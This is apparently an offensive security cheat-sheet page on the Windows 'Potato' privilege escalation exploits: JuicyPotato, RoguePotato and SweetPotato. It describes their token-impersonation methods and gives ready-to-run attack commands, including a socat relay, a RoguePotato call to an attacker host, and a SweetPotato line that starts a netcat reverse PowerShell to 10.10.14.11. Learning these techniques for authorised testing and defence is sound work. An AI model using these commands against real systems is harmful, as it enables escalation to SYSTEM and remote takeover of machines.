---
description: >-
  A series of exploits made for impersonating higher privilege system services
  by manipulating the way authentication and token management is done in
  Windows.
---

# Juicy/Rogue/SweetPotato

[https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

The "Potato" family of local privilege escalation (LPE) exploits abuses the `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` user rights (standard on service accounts such as `NT AUTHORITY\LOCAL SERVICE` and `NETWORK SERVICE`). Later versions of the exploit had to move to other methods of exploiting NTLM authentication when Microsoft started blocking the original paths.

They force a high-privileged system service (typically running as `NT AUTHORITY\SYSTEM`) to authenticate to a rogue local listener over RPC, relay or intercept the authentication challenge, and impersonate the resulting access token to spawn a process as `SYSTEM`.

#### JuicyPotato

{% embed url="https://github.com/ohpe/juicy-potato" %}

**Method:** Abuses the local DCOM/RPC infrastructure by specifying a target CLSID and listening on a local TCP port (127.0.0.1:6666). It forces the secondary COM service to connect to this listener and conducts a cross-protocol or local NTLM relay against the local RPC port (135).

**#JuicyPotato with the BITS' CLSID, the COM listener port on 1337, and both functions tested**\
`./juicypotato.exe -l 1337 -p C:\Windows\System32\powershell.exe -t *`

**#JuicyPotato with a .bat execution, a different CLSID, only the function CreateProcessWithTokenW used and a COM listener on 1337**\
`./juicypotato.exe -l 1337 -t CreateProcessWithTokenW -p pathToBat -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`

#### RoguePotato

{% embed url="https://github.com/antonioCoco/RoguePotato" %}

**Method:** Uses an RPC relay trick against an attacker-specified pipe. It instructs the DCOM server to bind to a rogue custom named pipe format (\\\\.\pipe\\...), intercepting the SYSTEM token through an RPC call to RpcImpersonateClient().

**#On the attacker machine, run the socat redirection**\
`socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999`

**#On the target machine, as an account with impersonation privileges**\
`.\RoguePotato.exe -r ATTACKER_IP -e "command" -l 9999`

#### SweetPotato

{% embed url="https://github.com/CCob/SweetPotato" %}

An all-in-one, consolidated .NET/C# weaponization tool. Rather than relying on a single trick, it bundles multiple privilege escalation techniques into a unified payload:

* JuicyPotato: Traditional DCOM/CLSID relay (for older builds).
* PrintSpoofer: Named-pipe impersonation abusing the Print Spooler service (`RpcOpenPrinter` / `RpcRemoteFindFirstPrinterChangeNotificationEx`).
* RoguePotato: Remote/proxied `OxidResolver` approach.
* WlanSvc (WinExecLPE): Exploitation targeting the WLAN AutoConfig Service on endpoints.
* Advantage: Dynamically falls back across COM, Print Spooler, and local RPC vectors, giving operators a single binary that works across nearly any Windows version where `SeImpersonate` is enabled.

**#SweetPotato with Netcat execution and arguments, directly in memory, via the WinRM attack**\
`execute-assembly ./SweetPotato -p ./nc.exe -a '10.10.14.11 4646 -e powershell' -e WinRM`
